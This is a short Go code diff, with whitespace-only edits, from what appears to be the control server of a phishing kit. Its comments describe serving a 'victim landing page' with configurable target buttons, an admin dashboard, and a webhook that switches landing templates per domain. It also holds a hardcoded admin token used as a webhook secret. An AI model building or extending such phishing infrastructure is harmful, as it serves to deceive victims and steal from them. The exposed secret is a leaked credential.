@@ -25,7 +25,7 @@ var (
 	activeConfig *GlobalConfig
 	configMu     sync.RWMutex
 	configPath   = "config.json"
-	
+
 	// This MUST match the PRISM_ROUTING_WEBHOOK_SECRET in your Node.js .env file.
 	adminToken = "a244a0c0f0210be8325ad0710df42872216a3acc460832a85086452792bc710c"
 )
@@ -90,7 +90,7 @@ func IsTargetEnabled(baseDomain, targetKey string) bool {
 // ── API HANDLERS ──
 
 // handleGetConfig is called by the victim landing page (App.jsx) to know which buttons to render.
-// It returns a unified structure: an array of enabled targets for the victim app, 
+// It returns a unified structure: an array of enabled targets for the victim app,
 // AND boolean/string states for the admin dashboard.
 func handleGetConfig(w http.ResponseWriter, r *http.Request) {
 	_, baseDomain, _ := resolveHost(r.Host)
@@ -255,7 +255,7 @@ func handleWebhookUpdate(w http.ResponseWriter, r *http.Request) {
 	saveConfigUnsafe() // Persist to disk
 	configMu.Unlock()
 
-	log.Printf("[⚙️] WEBHOOK UPDATE: %s -> Template: %s, Target: %s, DomainEnabled: %v", 
+	log.Printf("[⚙️] WEBHOOK UPDATE: %s -> Template: %s, Target: %s, DomainEnabled: %v",
 		req.Domain, state.LandingTemplate, req.Target, state.Enabled)
 
 	w.Header().Set("Content-Type", "application/json")
